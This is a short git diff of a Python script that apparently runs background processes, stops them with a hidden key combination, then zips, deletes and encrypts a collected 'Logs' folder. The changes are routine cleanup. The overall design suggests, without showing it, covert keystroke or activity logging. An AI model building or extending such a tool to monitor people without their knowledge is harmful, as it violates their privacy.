@@ -1,6 +1,4 @@
 import os
-import time
-
 import keyboard
 import shutil
 import multiprocessing
@@ -16,6 +14,7 @@ from Cryptography.EncryptFile import ZipFileEncryptor
 
 
 execute = False
+
 
 def stop_processes():
     global execute
@@ -58,20 +57,6 @@ if __name__ == "__main__":
     # Registering the hotkey to stop processes
     keyboard.add_hotkey("ctrl + shift + alt + s", stop_processes)
 
-    # if not execute:
-    #     try:
-    #         while True:
-    #             pass # to keep main program running
-    #     except KeyboardInterrupt:
-    #         print("user shutdown requested")
-    # else:
-    #     for process in processes:
-    #         process.terminate()
-    #
-    #     for process in processes:
-    #         process.join()
-    #     pass
-
     try:
         while True:
             if not execute:
@@ -93,9 +78,7 @@ if __name__ == "__main__":
     zip = Zip()
     zip.zip_file("../Logs","LogsZip")
     # os.remove("../Logs")
-    shutil.rmtree("../Logs") # Remove the "Logs" directory and its contents recursively
-
-    time.sleep(5)
+    shutil.rmtree("../Logs")    # Remove the "Logs" directory and its contents recursively
 
     # generating key to encrypt LogsZip file
     key_generator = KeyGenerator()
